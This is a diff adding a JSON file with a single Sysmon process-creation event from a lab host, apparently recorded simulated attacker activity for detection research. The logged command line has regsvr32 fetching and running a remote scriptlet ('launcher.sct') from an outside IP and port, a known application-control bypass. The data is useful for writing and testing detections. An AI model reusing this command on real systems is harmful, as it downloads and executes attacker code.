@@ -1,0 +1,33 @@
+[
+  {
+    "@timestamp": "2020-07-22T03:27:53.548Z",
+    "Channel": "Microsoft-Windows-Sysmon/Operational",
+    "CommandLine": "\"C:\\windows\\system32\\regsvr32.exe\" /s /n /u /i:http://10.10.10.5:8444/launcher.sct scrobj.dll",
+    "Company": "Microsoft Corporation",
+    "CurrentDirectory": "C:\\windows\\system32\\",
+    "Description": "Microsoft(C) Register Server",
+    "EventID": 1,
+    "EventType": "INFO",
+    "FileVersion": "10.0.18362.1 (WinBuild.160101.0800)",
+    "Hashes": "SHA1=8A00AD3F91F4DF913A49C6083F48F9530CCF5326,MD5=578BAB56836A3FE455FFC7883041825B,SHA256=8FFC7F80EFBF746E49F37EA3D140F042CF71EF20B4DA2A8F02688E79295DA11D,IMPHASH=0235FF9A007804882636BCCCFB4D1A2F",
+    "Hostname": "WORKSTATION5.mordor.local",
+    "Image": "C:\\Windows\\System32\\regsvr32.exe",
+    "IntegrityLevel": "High",
+    "LogonGuid": "{b59756a9-8990-5f17-a879-450200000000}",
+    "LogonId": "0x24579a8",
+    "OriginalFileName": "REGSVR32.EXE",
+    "ParentCommandLine": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" ",
+    "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "ParentProcessGuid": "{b59756a9-89dc-5f17-1006-000000000400}",
+    "ParentProcessId": "8648",
+    "ProcessGuid": "{b59756a9-b238-5f17-5207-000000000400}",
+    "ProcessId": "9384",
+    "Product": "Microsoft® Windows® Operating System",
+    "RecordNumber": 1770557,
+    "RuleName": "-",
+    "SourceName": "Microsoft-Windows-Sysmon",
+    "TerminalSessionId": "3",
+    "User": "MORDOR\\pgustavo",
+    "UtcTime": "2020-07-22 03:27:52.809"
+  }
+]
